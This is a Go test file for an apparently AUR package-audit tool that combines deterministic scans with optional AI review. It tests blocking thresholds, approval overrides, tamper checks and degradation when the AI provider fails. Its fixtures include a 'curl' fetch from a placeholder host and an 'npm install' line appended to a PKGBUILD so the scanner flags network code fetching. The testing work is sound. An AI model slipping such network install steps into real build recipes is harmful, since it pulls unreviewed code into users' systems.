package audit

import (
	"archive/tar"
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"github.com/holgerjh/prolewatch/internal/brief"
	"github.com/holgerjh/prolewatch/internal/safe"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// aiConfig is DefaultConfig with AI review switched on. The default is
// deterministic-only, so every test that exercises the provider path has to ask
// for it - which is the same thing a user has to do.
func aiConfig() Config {
	cfg := DefaultConfig()
	cfg.Review.Mode = ReviewModeAI
	// These tests scan the recipe phase, which is not reviewed unless asked
	// for. Enabling it here keeps them about the policy under test rather than
	// about the phase gate, which has its own test.
	cfg.Review.IncludeRecipePhase = true
	return cfg
}

// ScanDirectory keeps tests that do not exercise yay context focused on the
// policy behavior under test. Production callers always provide that context.
func (s *AuditService) ScanDirectory(ctx context.Context, phase, root, packageBase string) (*Report, int, error) {
	return s.ScanDirectoryWithContext(ctx, phase, root, packageBase, brief.YayContext{})
}

type fakeReviewer struct {
	err           error
	probeErr      error
	calls         int
	verdicts      []Verdict
	lastInventory *brief.Inventory
	lastOptions   ReviewOptions
}

func (f *fakeReviewer) Probe(context.Context) (ProviderMetadata, error) {
	metadata := ProviderMetadata{Provider: "codex", Transport: "cli", RuntimeVersion: "codex-cli test", Model: "gpt", Effort: "high", AdapterPolicy: "test-v1"}
	return metadata, f.probeErr
}

func TestProviderFailureIsBoundedIntoValidBriefing(t *testing.T) {
	withStateAndShare(t)
	reviewer := &fakeReviewer{err: errors.New(strings.Repeat("provider failure ", 700))}
	service, err := NewAuditService(context.Background(), aiConfig(), reviewer)
	if err != nil {
		t.Fatal(err)
	}
	root := t.TempDir()
	writePackageFixture(t, root)
	report, status, err := service.ScanDirectory(context.Background(), "pre", root, "demo")
	if err != nil || status != 0 || report == nil {
		t.Fatalf("provider failure did not degrade to a deterministic briefing: status=%d err=%v", status, err)
	}
	if len(report.Reviewer.Error) > 4*1024 || len(report.Summary) > 8192 || report.Validate() != nil {
		t.Fatalf("provider failure escaped report bounds: error=%d summary=%d", len(report.Reviewer.Error), len(report.Summary))
	}
}

func (f *fakeReviewer) Review(_ context.Context, _ string, _ string, inventory *brief.Inventory, options ReviewOptions) (ProviderMetadata, []Verdict, error) {
	f.calls++
	f.lastInventory = inventory
	f.lastOptions = options
	metadata, _ := f.Probe(context.Background())
	if f.err != nil {
		return metadata, nil, f.err
	}
	if f.verdicts != nil {
		return metadata, f.verdicts, nil
	}
	return metadata, []Verdict{{SchemaVersion: VerdictSchemaVersion, Verdict: "allow", Confidence: "high", Summary: "safe", Findings: []ReviewFinding{}, Guidance: []FindingGuidance{}, CoverageNotes: []string{}}}, nil
}

func TestMinimumConfidencePolicy(t *testing.T) {
	for _, current := range []struct {
		minimum string
		status  int
	}{
		{minimum: "high", status: 10},
		{minimum: "medium", status: 0},
		{minimum: "low", status: 0},
	} {
		t.Run(current.minimum, func(t *testing.T) {
			withStateAndShare(t)
			root := t.TempDir()
			writePackageFixture(t, root)
			cfg := aiConfig()
			cfg.Review.MinimumConfidence = current.minimum
			reviewer := &fakeReviewer{verdicts: []Verdict{{SchemaVersion: VerdictSchemaVersion, Verdict: "allow", Confidence: "medium", Summary: "looks safe", Findings: []ReviewFinding{}, Guidance: []FindingGuidance{}, CoverageNotes: []string{}}}}
			service, err := NewAuditService(context.Background(), cfg, reviewer)
			if err != nil {
				t.Fatal(err)
			}
			report, status, err := service.ScanDirectory(context.Background(), "pre", root, "demo")
			if err != nil || status != current.status {
				t.Fatalf("minimum=%s status=%d want=%d err=%v", current.minimum, status, current.status, err)
			}
			if current.status == 10 && (!report.ApprovalEligible || !confidenceOnlyBlock(report, cfg)) {
				t.Fatalf("confidence-only block was misclassified: %+v", report)
			}
			// There is no separate disposition for a low-confidence AI
			// agreement. The allow comes from the deterministic pass; a distinct
			// name would imply the model made the decision.
			if current.status == 0 && report.Disposition != "allow" {
				t.Fatalf("threshold allow produced disposition %q", report.Disposition)
			}
			if current.status == 0 {
				rendered := RenderReport(report)
				if strings.Contains(rendered, "AUTO-ALLOW") || strings.Contains(rendered, "Automatically allowed") {
					t.Fatalf("the report still credits the model with allowing:\n%s", rendered)
				}
				if !strings.Contains(rendered, "AI confidence: medium") || !strings.Contains(rendered, "Minimum confidence: "+current.minimum) {
					t.Fatalf("confidence feedback is incomplete:\n%s", rendered)
				}
				if !strings.Contains(rendered, "it did not decide this") {
					t.Fatalf("the summary does not say the model did not decide:\n%s", rendered)
				}
			}
		})
	}
}

func TestAICoverageGapOffersExactInteractiveOverride(t *testing.T) {
	withStateAndShare(t)
	root := t.TempDir()
	writePackageFixture(t, root)
	reviewer := &fakeReviewer{verdicts: []Verdict{{
		SchemaVersion: VerdictSchemaVersion,
		Verdict:       "allow",
		Confidence:    "high",
		Summary:       "reviewed selected files",
		Findings:      []ReviewFinding{},
		Guidance:      []FindingGuidance{},
		CoverageNotes: []string{"generated commands could not be inspected"},
	}}}
	service, err := NewAuditService(context.Background(), aiConfig(), reviewer)
	if err != nil {
		t.Fatal(err)
	}
	report, status, err := service.ScanDirectory(context.Background(), "pre", root, "demo")
	if err != nil || status != 10 || report.Decision != "block" || !report.ApprovalEligible {
		t.Fatalf("coverage gap did not produce an approval-eligible block: status=%d report=%+v err=%v", status, report, err)
	}
	if got := classifyInlineDecision(report, service.Config); got != inlineOverride {
		t.Fatalf("coverage gap inline decision=%q, want %q", got, inlineOverride)
	}
	rendered := RenderReport(report)
	if !strings.Contains(rendered, "AI coverage gaps:") || !strings.Contains(rendered, "generated commands could not be inspected") || !strings.Contains(rendered, "prolewatch approve ") {
		t.Fatalf("coverage gap report omitted its reason or override: %s", rendered)
	}
	if _, err := service.Approvals.Create(report, "approval", "reviewed coverage gap"); err != nil {
		t.Fatal(err)
	}
	overridden, status, err := service.ScanDirectory(context.Background(), "pre", root, "demo")
	if err != nil || status != 0 || overridden.Decision != "allow" || !overridden.Overridden {
		t.Fatalf("coverage-gap override was not consumed exactly once: status=%d report=%+v err=%v", status, overridden, err)
	}
}

func TestAIHighFindingCannotRenderAutomaticAllowSummary(t *testing.T) {
	withStateAndShare(t)
	root := t.TempDir()
	writePackageFixture(t, root)
	cfg := aiConfig()
	cfg.Review.MinimumConfidence = "medium"
	reviewer := &fakeReviewer{verdicts: []Verdict{{SchemaVersion: VerdictSchemaVersion, Verdict: "allow", Confidence: "medium", Summary: "review needed", Findings: []ReviewFinding{{Severity: "high", Category: "other", File: "PKGBUILD", Rationale: "high-risk behavior"}}, Guidance: []FindingGuidance{}, CoverageNotes: []string{}}}}
	service, err := NewAuditService(context.Background(), cfg, reviewer)
	if err != nil {
		t.Fatal(err)
	}
	report, status, err := service.ScanDirectory(context.Background(), "pre", root, "demo")
	if err != nil || status != 10 || report.Disposition != "block" || !strings.Contains(report.Summary, "AI finding(s) at HIGH or above") || strings.Contains(report.Summary, "Automatically allowed") {
		t.Fatalf("misleading AI finding decision: report=%+v status=%d err=%v", report, status, err)
	}
}

func TestDecisionMarkerSurvivesCleanBuildCheckoutReplacement(t *testing.T) {
	withStateAndShare(t)
	parent := t.TempDir()
	root := filepath.Join(parent, "demo")
	if err := os.Mkdir(root, 0o700); err != nil {
		t.Fatal(err)
	}
	writePackageFixture(t, root)
	service, err := NewAuditService(context.Background(), aiConfig(), &fakeReviewer{})
	if err != nil {
		t.Fatal(err)
	}
	report, status, err := service.ScanDirectory(context.Background(), "pre", root, "demo")
	if err != nil || status != 0 {
		t.Fatalf("pre-scan failed: report=%+v status=%d err=%v", report, status, err)
	}
	canonical, marker, err := markerLocation(root, "pre", report.Transaction)
	if err != nil {
		t.Fatal(err)
	}
	if canonical != root || !regularNoFollow(marker) || strings.HasPrefix(marker, root+string(os.PathSeparator)) {
		t.Fatalf("marker was not stored outside the checkout: root=%q canonical=%q marker=%q", root, canonical, marker)
	}
	if _, err := os.Lstat(filepath.Join(root, brief.MarkerPrefix+"pre.json")); !errors.Is(err, os.ErrNotExist) {
		t.Fatalf("legacy in-checkout marker was written: %v", err)
	}
	oldRoot := filepath.Join(parent, "demo-cleaned")
	if err := os.Rename(root, oldRoot); err != nil {
		t.Fatal(err)
	}
	if err := os.Mkdir(root, 0o700); err != nil {
		t.Fatal(err)
	}
	writePackageFixture(t, root)
	verified, err := service.VerifyMarker(root, "pre")
	if err != nil || verified.ReportID != report.ReportID {
		t.Fatalf("clean-build replacement lost exact marker authority: report=%+v err=%v", verified, err)
	}
	if err := os.WriteFile(filepath.Join(root, "local.patch"), []byte("changed after clean build\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := service.VerifyMarker(root, "pre"); err == nil || !strings.Contains(err.Error(), "content changed") {
		t.Fatalf("changed replacement checkout retained marker authority: %v", err)
	}
}

func withStateAndShare(t *testing.T) {
	t.Helper()
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	share, err := filepath.Abs(filepath.Join("..", "..", "share"))
	if err != nil {
		t.Fatal(err)
	}
	t.Setenv("PROLEWATCH_SHARE", share)
}

func TestPolicyAllowsSafeFixtureAndStoresCurrentReport(t *testing.T) {
	withStateAndShare(t)
	root := t.TempDir()
	writePackageFixture(t, root)
	reviewer := &fakeReviewer{}
	service, err := NewAuditService(context.Background(), aiConfig(), reviewer)
	if err != nil {
		t.Fatal(err)
	}
	report, status, err := service.ScanDirectory(context.Background(), "pre", root, "demo")
	if err != nil {
		t.Fatal(err)
	}
	if status != 0 || report.SchemaVersion != ReportSchemaVersion || report.Reviewer.Provider != "codex" {
		t.Fatalf("unexpected report: %d %+v", status, report)
	}
	if reviewer.calls != 1 {
		t.Fatalf("review calls=%d", reviewer.calls)
	}
}
func TestPolicyProviderErrorDegradesToDeterministicBriefing(t *testing.T) {
	withStateAndShare(t)
	root := t.TempDir()
	writePackageFixture(t, root)
	service, err := NewAuditService(context.Background(), aiConfig(), &fakeReviewer{err: errors.New("offline")})
	if err != nil {
		t.Fatal(err)
	}
	report, status, err := service.ScanDirectory(context.Background(), "pre", root, "demo")
	if err != nil {
		t.Fatal(err)
	}
	if status != 0 || report.Decision != "allow" {
		t.Fatalf("a provider outage blocked an otherwise clean package: status=%d decision=%q", status, report.Decision)
	}
	if !strings.Contains(report.Reviewer.Error, "offline") || !strings.Contains(report.Summary, "AI review unavailable") {
		t.Fatalf("the briefing does not say the AI section is missing: %q", report.Summary)
	}
}

// A provider timeout is a degraded review, not a failed transaction. The
// package still gets a decision, and the briefing has to say the AI section is
// missing - otherwise a silent timeout is indistinguishable from an AI pass.
//
// This used to assert against a persisted activity record. The record had no
// reader; the report does, and it is where a user would look.
func TestProviderTimeoutDegradesTheReviewWithoutBlocking(t *testing.T) {
	withStateAndShare(t)
	root := t.TempDir()
	writePackageFixture(t, root)
	ctx := context.Background()
	service, err := NewAuditService(ctx, aiConfig(), &fakeReviewer{err: ErrProviderTimeout})
	if err != nil {
		t.Fatal(err)
	}
	report, status, err := service.ScanDirectory(ctx, "pre", root, "demo")
	if err != nil || status != 0 {
		t.Fatalf("a provider timeout blocked an otherwise clean package: status=%d err=%v", status, err)
	}
	if report.Reviewer.Error == "" {
		t.Fatal("the report does not record that the provider timed out")
	}
	if !strings.Contains(report.Summary, "AI review unavailable") {
		t.Fatalf("the briefing does not say the AI section is missing: %q", report.Summary)
	}
}

func TestDeterministicOnlySkipsProviderAndAllowsWarnings(t *testing.T) {
	withStateAndShare(t)
	root := t.TempDir()
	writePackageFixture(t, root)
	if err := os.WriteFile(filepath.Join(root, "fetch.sh"), []byte("curl https://example.invalid/source\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	cfg := DefaultConfig()
	cfg.Review.Mode = ReviewModeDeterministicOnly
	reviewer := &fakeReviewer{err: errors.New("must not be called")}
	service, err := NewAuditService(context.Background(), cfg, reviewer)
	if err != nil {
		t.Fatal(err)
	}
	report, status, err := service.ScanDirectory(context.Background(), "pre", root, "demo")
	if err != nil {
		t.Fatal(err)
	}
	if status != 0 || report.Decision != "allow" || reviewer.calls != 0 || report.Reviewer.Mode != ReviewModeDeterministicOnly || report.Reviewer.Provider != "" || len(report.Reviewer.Verdicts) != 0 {
		t.Fatalf("unexpected deterministic-only warning policy: status=%d calls=%d report=%+v", status, reviewer.calls, report)
	}
}

func TestDeterministicOnlyBlocksHighFindingButAllowsExactApproval(t *testing.T) {
	withStateAndShare(t)
	root := t.TempDir()
	writePackageFixture(t, root)
	pkgbuild := filepath.Join(root, "PKGBUILD")
	file, err := os.OpenFile(pkgbuild, os.O_APPEND|os.O_WRONLY, 0)
	if err != nil {
		t.Fatal(err)
	}
	_, writeErr := file.WriteString("npm install harmless-package\n")
	closeErr := file.Close()
	if writeErr != nil || closeErr != nil {
		t.Fatalf("append fixture: %v / %v", writeErr, closeErr)
	}
	cfg := DefaultConfig()
	cfg.Review.Mode = ReviewModeDeterministicOnly
	service, err := NewAuditService(context.Background(), cfg, &fakeReviewer{})
	if err != nil {
		t.Fatal(err)
	}
	report, status, err := service.ScanDirectory(context.Background(), "pre", root, "demo")
	if err != nil {
		t.Fatal(err)
	}
	if status != 10 || report.Decision != "block" || !report.ApprovalEligible || structuralBlock(&brief.Inventory{Findings: report.Findings, Coverage: report.Coverage}) {
		t.Fatalf("unexpected deterministic-only high policy: status=%d report=%+v", status, report)
	}
	if _, err := service.Approvals.Create(report, "approval", "reviewed deterministic high finding"); err != nil {
		t.Fatal(err)
	}
	overridden, status, err := service.ScanDirectory(context.Background(), "pre", root, "demo")
	if err != nil {
		t.Fatal(err)
	}
	if status != 0 || overridden.Decision != "allow" || !overridden.Overridden || overridden.ApprovalEligible {
		t.Fatalf("exact deterministic approval was not consumed: status=%d report=%+v", status, overridden)
	}
}

func TestApprovedRecipeFindingsCarryToTheSourcesGate(t *testing.T) {
	withStateAndShare(t)
	root := t.TempDir()
	writeBlockingFixture(t, root)
	service := newDeterministicTestService(t)
	approved := approveRecipeFixture(t, service, root)

	post, status, err := service.ScanDirectory(context.Background(), "post", root, "demo")
	if err != nil || status != 0 || post.Decision != "allow" || post.Disposition != "allow" || post.Overridden {
		t.Fatalf("unchanged approved findings prompted again: status=%d report=%+v err=%v", status, post, err)
	}
	if post.CarriedDecision == nil || post.CarriedDecision.SourceReportID != approved.ReportID || len(post.CarriedDecision.Findings) == 0 {
		t.Fatalf("post report omitted carry-over provenance: %+v", post.CarriedDecision)
	}
	if len(post.Findings) < len(post.CarriedDecision.Findings) || !strings.Contains(post.Summary, "No new decision is required") || reportOutcome(post) != "NO NEW DECISION NEEDED" {
		t.Fatalf("carry-over hid findings or used a false clean outcome: %+v", post)
	}
	verified, err := service.VerifyMarker(root, "post")
	if err != nil || verified.ReportID != post.ReportID || len(verified.Findings) != len(post.Findings) || verified.CarriedDecision == nil {
		t.Fatalf("allow/allow marker erased carried findings: verified=%+v err=%v", verified, err)
	}
}

func TestApprovedRecipeFindingsCarryAcrossCleanBuildReplacement(t *testing.T) {
	withStateAndShare(t)
	parent := t.TempDir()
	root := filepath.Join(parent, "demo")
	if err := os.Mkdir(root, 0o700); err != nil {
		t.Fatal(err)
	}
	writeBlockingFixture(t, root)
	service := newDeterministicTestService(t)
	approveRecipeFixture(t, service, root)

	oldRoot := filepath.Join(parent, "demo-cleaned")
	if err := os.Rename(root, oldRoot); err != nil {
		t.Fatal(err)
	}
	if err := os.Mkdir(root, 0o700); err != nil {
		t.Fatal(err)
	}
	writeBlockingFixture(t, root)
	post, status, err := service.ScanDirectory(context.Background(), "post", root, "demo")
	if err != nil || status != 0 || post.CarriedDecision == nil {
		t.Fatalf("byte-identical cleanBuild replacement lost carry-over: status=%d report=%+v err=%v", status, post, err)
	}
}

func TestManifestEntryChangeDefeatsFindingCarryOver(t *testing.T) {
	withStateAndShare(t)
	root := t.TempDir()
	writeBlockingFixture(t, root)
	service := newDeterministicTestService(t)
	approveRecipeFixture(t, service, root)

	if err := os.Chmod(filepath.Join(root, "PKGBUILD"), 0o700); err != nil {
		t.Fatal(err)
	}
	post, status, err := service.ScanDirectory(context.Background(), "post", root, "demo")
	if err != nil || status != ExitPolicyBlock || post.Decision != "block" || post.CarriedDecision != nil {
		t.Fatalf("changed manifest metadata retained carry-over: status=%d report=%+v err=%v", status, post, err)
	}
}

func TestIncompleteApprovedRecipeReportCannotCarryAuthority(t *testing.T) {
	withStateAndShare(t)
	root := t.TempDir()
	writeBlockingFixture(t, root)
	service := newDeterministicTestService(t)
	approved := approveRecipeFixture(t, service, root)

	// This state cannot be produced by policy, but reports live in user-owned
	// state. Even if that state is edited into an allow/override report, missing
	// source coverage must prevent it from suppressing the next question.
	approved.Coverage.Complete = false
	approved.Coverage.Notes = append(approved.Coverage.Notes, "forced incomplete source coverage")
	if err := AtomicWriteJSON(filepath.Join(service.Reports.Root, approved.ReportID+".json"), approved); err != nil {
		t.Fatal(err)
	}
	post, status, err := service.ScanDirectory(context.Background(), "post", root, "demo")
	if err != nil || status != ExitPolicyBlock || post.CarriedDecision != nil {
		t.Fatalf("incomplete source report suppressed a fresh decision: status=%d report=%+v err=%v", status, post, err)
	}
}

func TestAIFindingsNeverCarryAcrossGates(t *testing.T) {
	withStateAndShare(t)
	root := t.TempDir()
	writeBlockingFixture(t, root)
	reviewer := &fakeReviewer{verdicts: []Verdict{{SchemaVersion: VerdictSchemaVersion, Verdict: "allow", Confidence: "high", Summary: "independent concern", Findings: []ReviewFinding{{Severity: "high", Category: "other", File: "PKGBUILD", Evidence: "provider concern", Rationale: "fresh AI finding"}}, Guidance: []FindingGuidance{}, CoverageNotes: []string{}}}}
	service, err := NewAuditService(context.Background(), aiConfig(), reviewer)
	if err != nil {
		t.Fatal(err)
	}
	approveRecipeFixture(t, service, root)
	post, status, err := service.ScanDirectory(context.Background(), "post", root, "demo")
	if err != nil || status != ExitPolicyBlock || post.Decision != "block" || post.CarriedDecision == nil {
		t.Fatalf("fresh AI evidence failed to stop a carried deterministic decision: status=%d report=%+v err=%v", status, post, err)
	}
	for _, binding := range post.CarriedDecision.Findings {
		for _, finding := range post.Findings {
			if finding.Source == "ai" && binding.FindingID == findingGuidanceID(finding) {
				t.Fatalf("AI finding was represented as carried: %+v", binding)
			}
		}
	}
}

func TestAISeesTheFullPostInventoryButSkipsGuidanceForCarriedFindings(t *testing.T) {
	withStateAndShare(t)
	root := t.TempDir()
	writeBlockingFixture(t, root)
	reviewer := &fakeReviewer{}
	service, err := NewAuditService(context.Background(), aiConfig(), reviewer)
	if err != nil {
		t.Fatal(err)
	}
	approveRecipeFixture(t, service, root)

	post, status, err := service.ScanDirectory(context.Background(), "post", root, "demo")
	if err != nil || status != 0 || post.CarriedDecision == nil {
		t.Fatalf("AI post carry-over failed: status=%d report=%+v err=%v", status, post, err)
	}
	if reviewer.calls != 2 || reviewer.lastInventory == nil || len(reviewer.lastInventory.Findings) == 0 {
		t.Fatalf("AI did not receive the full current inventory: calls=%d inventory=%+v", reviewer.calls, reviewer.lastInventory)
	}
	for _, binding := range post.CarriedDecision.Findings {
		if !reviewer.lastOptions.SkipGuidanceFindingIDs[binding.FindingID] {
			t.Fatalf("carried finding %s was requested as fresh guidance", binding.FindingID)
		}
		found := false
		for _, finding := range reviewer.lastInventory.Findings {
			found = found || findingGuidanceID(finding) == binding.FindingID
		}
		if !found {
			t.Fatalf("carried finding %s was removed from the AI snapshot inventory", binding.FindingID)
		}
	}
}

func TestCarriedDecisionReportBindingsRejectTampering(t *testing.T) {
	withStateAndShare(t)
	root := t.TempDir()
	writeBlockingFixture(t, root)
	service := newDeterministicTestService(t)
	approveRecipeFixture(t, service, root)
	post, status, err := service.ScanDirectory(context.Background(), "post", root, "demo")
	if err != nil || status != 0 || post.Validate() != nil || post.CarriedDecision == nil {
		t.Fatalf("could not construct valid carried report: status=%d report=%+v err=%v", status, post, err)
	}

	clone := func() *Report {
		raw, marshalErr := json.Marshal(post)
		if marshalErr != nil {
			t.Fatal(marshalErr)
		}
		var copied Report
		if unmarshalErr := json.Unmarshal(raw, &copied); unmarshalErr != nil {
			t.Fatal(unmarshalErr)
		}
		return &copied
	}
	tests := map[string]func(*Report){
		"unknown finding":      func(report *Report) { report.CarriedDecision.Findings[0].FindingID = strings.Repeat("f", 64) },
		"wrong manifest entry": func(report *Report) { report.CarriedDecision.Findings[0].ManifestEntryHash = strings.Repeat("f", 64) },
		"duplicate binding": func(report *Report) {
			report.CarriedDecision.Findings = append(report.CarriedDecision.Findings, report.CarriedDecision.Findings[0])
		},
		"wrong phase": func(report *Report) { report.Phase, report.NetworkEligible = "pre", false },
	}
	for name, mutate := range tests {
		t.Run(name, func(t *testing.T) {
			candidate := clone()
			mutate(candidate)
			if candidate.Validate() == nil {
				t.Fatalf("tampered carried report was accepted: %+v", candidate.CarriedDecision)
			}
		})
	}
}

func newDeterministicTestService(t *testing.T) *AuditService {
	t.Helper()
	cfg := DefaultConfig()
	cfg.Review.Mode = ReviewModeDeterministicOnly
	service, err := NewAuditService(context.Background(), cfg, &fakeReviewer{})
	if err != nil {
		t.Fatal(err)
	}
	return service
}

func approveRecipeFixture(t *testing.T, service *AuditService, root string) *Report {
	t.Helper()
	report, status, err := service.ScanDirectory(context.Background(), "pre", root, "demo")
	if err != nil || status != ExitPolicyBlock || !report.ApprovalEligible {
		t.Fatalf("fixture did not require an approvable recipe decision: status=%d report=%+v err=%v", status, report, err)
	}
	if _, err := service.Approvals.Create(report, "approval", "reviewed exact recipe finding"); err != nil {
		t.Fatal(err)
	}
	approved, status, err := service.ScanDirectory(context.Background(), "pre", root, "demo")
	if err != nil || status != 0 || approved.Decision != "allow" || approved.Disposition != "override" || !approved.Overridden {
		t.Fatalf("fixture approval was not consumed: status=%d report=%+v err=%v", status, approved, err)
	}
	return approved
}

func TestDeterministicAssessmentMatchesPolicyBoundaries(t *testing.T) {
	complete := brief.Coverage{Complete: true}
	cases := []struct {
		name       string
		inventory  *brief.Inventory
		decision   string
		approval   bool
		structural bool
	}{
		{name: "nil", inventory: nil, decision: "block", structural: true},
		{name: "safe", inventory: &brief.Inventory{Coverage: complete, ManifestHash: strings.Repeat("a", 64)}, decision: "allow"},
		{name: "warning", inventory: &brief.Inventory{Coverage: complete, ManifestHash: strings.Repeat("a", 64), Findings: []brief.Finding{{Severity: "medium"}}}, decision: "allow"},
		{name: "high", inventory: &brief.Inventory{Coverage: complete, ManifestHash: strings.Repeat("a", 64), Findings: []brief.Finding{{Severity: "high"}}}, decision: "block", approval: true},
		{name: "hard", inventory: &brief.Inventory{Coverage: complete, ManifestHash: strings.Repeat("a", 64), Findings: []brief.Finding{{Severity: "critical", HardBlock: true}}}, decision: "block", structural: true},
		{name: "incomplete", inventory: &brief.Inventory{Coverage: brief.Coverage{Complete: false}, ManifestHash: strings.Repeat("a", 64)}, decision: "block", structural: true},
	}
	for _, current := range cases {
		t.Run(current.name, func(t *testing.T) {
			assessment := AssessDeterministic(current.inventory)
			if assessment.Decision != current.decision || assessment.ApprovalEligible != current.approval || assessment.StructuralBlock != current.structural {
				t.Fatalf("assessment=%+v", assessment)
			}
		})
	}
}

func TestManualReviewMinimumSeverityChangesOnlyTheDecisionThreshold(t *testing.T) {
	inv := &brief.Inventory{Coverage: brief.Coverage{Complete: true}, ManifestHash: strings.Repeat("a", 64), Findings: []brief.Finding{{Severity: "medium"}}}
	if got := AssessDeterministicAt(inv, "high"); got.Decision != "allow" {
		t.Fatalf("default HIGH threshold blocked MEDIUM evidence: %+v", got)
	}
	if got := AssessDeterministicAt(inv, "medium"); got.Decision != "block" || !got.ApprovalEligible {
		t.Fatalf("MEDIUM threshold did not require a bounded decision: %+v", got)
	}
	if got := AssessDeterministicAt(inv, "invalid"); got.Decision != "block" || got.ApprovalEligible {
		t.Fatalf("invalid threshold failed open: %+v", got)
	}
	inv.Findings[0].HardBlock = true
	if got := AssessDeterministicAt(inv, "critical"); got.Decision != "block" || got.ApprovalEligible {
		t.Fatalf("raising the threshold crossed a structural hard block: %+v", got)
	}
}

func TestDeterministicFingerprintIgnoresProviderIdentityAndAssets(t *testing.T) {
	withStateAndShare(t)
	cfg := DefaultConfig()
	cfg.Review.Mode = ReviewModeDeterministicOnly
	archive, err := brief.ArchiveProbeIdentity(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	first, err := ComputePolicyFingerprint(cfg, ProviderMetadata{}, archive)
	if err != nil {
		t.Fatal(err)
	}
	cfg.Provider = "anthropic"
	cfg.Providers.Anthropic.Model = "different"
	cfg.Review.TimeoutSeconds++
	second, err := ComputePolicyFingerprint(cfg, ProviderMetadata{Provider: "anthropic", RuntimeVersion: "ignored"}, archive)
	if err != nil {
		t.Fatal(err)
	}
	if first != second {
		t.Fatalf("AI-only configuration changed deterministic fingerprint: %s != %s", first, second)
	}
	aiCfg := aiConfig()
	metadata, _ := (&fakeReviewer{}).Probe(context.Background())
	aiFingerprint, err := ComputePolicyFingerprint(aiCfg, metadata, archive)
	if err != nil {
		t.Fatal(err)
	}
	if aiFingerprint == first {
		t.Fatal("review mode did not change the policy fingerprint")
	}
	aiCfg.Terminal.Style = TerminalStylePlain
	plainFingerprint, err := ComputePolicyFingerprint(aiCfg, metadata, archive)
	if err != nil {
		t.Fatal(err)
	}
	if plainFingerprint != aiFingerprint {
		t.Fatal("terminal presentation changed the security policy fingerprint")
	}
	aiCfg.Vendor.ScanDepth = 1
	depthFingerprint, err := ComputePolicyFingerprint(aiCfg, metadata, archive)
	if err != nil {
		t.Fatal(err)
	}
	if depthFingerprint == plainFingerprint {
		t.Fatal("vendor scan depth did not change the security policy fingerprint")
	}
	aiCfg = aiConfig()
	networkDefaultFingerprint, err := ComputePolicyFingerprint(aiCfg, metadata, archive)
	if err != nil {
		t.Fatal(err)
	}
	aiCfg.Network.PromptTimeoutSeconds++
	leaseOnlyFingerprint, err := ComputePolicyFingerprint(aiCfg, metadata, archive)
	if err != nil {
		t.Fatal(err)
	}
	if leaseOnlyFingerprint == networkDefaultFingerprint {
		t.Fatal("interactive network grant policy did not change the security policy fingerprint")
	}
}

// Every build setting changes the containment envelope and must therefore move
// the policy fingerprint that binds reports, approvals, and attestations.
func TestBuildFieldsMoveThePolicyFingerprint(t *testing.T) {
	withStateAndShare(t)
	archive, err := brief.ArchiveProbeIdentity(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	fingerprint := func(mutate func(*BuildConfig)) string {
		t.Helper()
		cfg := DefaultConfig()
		cfg.Review.Mode = ReviewModeDeterministicOnly
		mutate(&cfg.Build)
		value, err := ComputePolicyFingerprint(cfg, ProviderMetadata{}, archive)
		if err != nil {
			t.Fatal(err)
		}
		return value
	}
	base := fingerprint(func(*BuildConfig) {})
	for name, mutate := range map[string]func(*BuildConfig){
		"memory_bytes":       func(b *BuildConfig) { b.MemoryBytes++ },
		"cpu_count":          func(b *BuildConfig) { b.CPUCount++ },
		"tasks_max":          func(b *BuildConfig) { b.TasksMax++ },
		"timeout_seconds":    func(b *BuildConfig) { b.TimeoutSeconds++ },
		"workspace_bytes":    func(b *BuildConfig) { b.WorkspaceBytes++ },
		"workspace_files":    func(b *BuildConfig) { b.WorkspaceFiles++ },
		"output_bytes":       func(b *BuildConfig) { b.OutputBytes++ },
		"disk_reserve_bytes": func(b *BuildConfig) { b.DiskReserveBytes++ },
	} {
		if fingerprint(mutate) == base {
			t.Fatalf("%s changes the containment envelope but not the policy fingerprint", name)
		}
	}
}

func TestPostReportCarriesVerificationReceiptAndBindsVendorBytes(t *testing.T) {
	withStateAndShare(t)
	root := t.TempDir()
	archive := vendorTarBytes(t, map[string][]byte{"safe.txt": []byte("safe\n")})
	writeRemoteSourceFixture(t, root, archive)
	service, err := NewAuditService(context.Background(), aiConfig(), &fakeReviewer{})
	if err != nil {
		t.Fatal(err)
	}
	pre, status, err := service.ScanDirectory(context.Background(), "pre", root, "demo")
	if err != nil || status != 0 {
		t.Fatalf("pre report: status=%d report=%+v err=%v", status, pre, err)
	}
	pre.SourceVerification = brief.SourceVerification{Checksums: "passed", PGP: "not-applicable"}
	if err := service.Reports.Replace(pre); err != nil {
		t.Fatal(err)
	}
	post, status, err := service.ScanDirectory(context.Background(), "post", root, "demo")
	if err != nil || status != 0 {
		t.Fatalf("post report: status=%d report=%+v err=%v", status, post, err)
	}
	if post.SourceVerification != pre.SourceVerification || len(post.Sources) != 1 || post.Sources[0].ObservedSHA256 != safe.SHA256Bytes(archive) || post.Sources[0].ContentInspected {
		t.Fatalf("post report lost verification or binding: %+v %#v", post.SourceVerification, post.Sources)
	}
	post.SourceVerification = brief.SourceVerification{Checksums: "passed", PGP: "verified"}
	if err := service.Reports.Replace(post); err != nil {
		t.Fatal(err)
	}
	refreshed, status, err := service.ScanDirectory(context.Background(), "post", root, "demo")
	if err != nil || status != 0 || refreshed.SourceVerification.PGP != "verified" {
		t.Fatalf("post receipt did not advance: status=%d receipt=%+v err=%v", status, refreshed.SourceVerification, err)
	}
	if _, err := service.VerifyMarker(root, "post"); err != nil {
		t.Fatalf("unchanged vendor source did not verify: %v", err)
	}
	changed := append(append([]byte{}, archive...), '\n')
	if err := os.WriteFile(filepath.Join(root, "source.tar"), changed, 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := service.VerifyMarker(root, "post"); err == nil || !strings.Contains(err.Error(), "content changed") {
		t.Fatalf("changed vendor bytes retained marker authority: %v", err)
	}
}
func TestLegacyReportRejected(t *testing.T) {
	withStateAndShare(t)
	store := NewReportStore()
	if err := EnsurePrivateDir(store.Root); err != nil {
		t.Fatal(err)
	}
	id := "20260812T010203Z-aaaaaaaaaaaa-bbbbbbbb"
	if err := os.WriteFile(filepath.Join(store.Root, id+".json"), []byte(`{"schema_version":2,"report_id":"`+id+`"}`), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := store.Load(id); err == nil {
		t.Fatal("legacy report accepted")
	}
}

